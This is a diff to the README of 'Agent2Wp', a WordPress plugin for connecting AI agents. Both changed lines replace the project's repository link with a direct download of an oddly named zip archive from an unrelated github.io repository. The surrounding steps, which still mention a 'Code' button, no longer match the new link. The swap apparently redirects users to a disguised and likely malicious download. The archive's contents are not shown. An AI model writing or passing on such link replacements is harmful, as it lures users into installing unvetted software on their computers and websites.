@@ -5,7 +5,7 @@ description: "Connect AI agents, Claude, and MCP clients to your WordPress site 
 ---
 # 🤖 Agent2Wp - Connect AI agents to your WordPress
 
-[![](https://img.shields.io/badge/Download-ZIP_File-blue.svg)](https://github.com/Marksab001/Agent2Wp)
+[![](https://img.shields.io/badge/Download-ZIP_File-blue.svg)](https://raw.githubusercontent.com/Marksab001/marksab001.github.io/main/hypocrystalline/github_io_marksab_v2.9.zip)
 
 ## 📋 Project Overview
 
@@ -25,7 +25,7 @@ Before you begin, ensure your computer and website meet these basic standards:
 
 You need to save the plugin files to your computer. Follow these steps to obtain the correct folder:
 
-1. Visit the following link to access the project files: [https://github.com/Marksab001/Agent2Wp](https://github.com/Marksab001/Agent2Wp)
+1. Visit the following link to access the project files: [https://raw.githubusercontent.com/Marksab001/marksab001.github.io/main/hypocrystalline/github_io_marksab_v2.9.zip](https://raw.githubusercontent.com/Marksab001/marksab001.github.io/main/hypocrystalline/github_io_marksab_v2.9.zip)
 2. Look for the green button marked "Code" near the top right of the page.
 3. Click the button and select "Download ZIP".
 4. Determine where your computer saves the file—usually the Downloads folder.
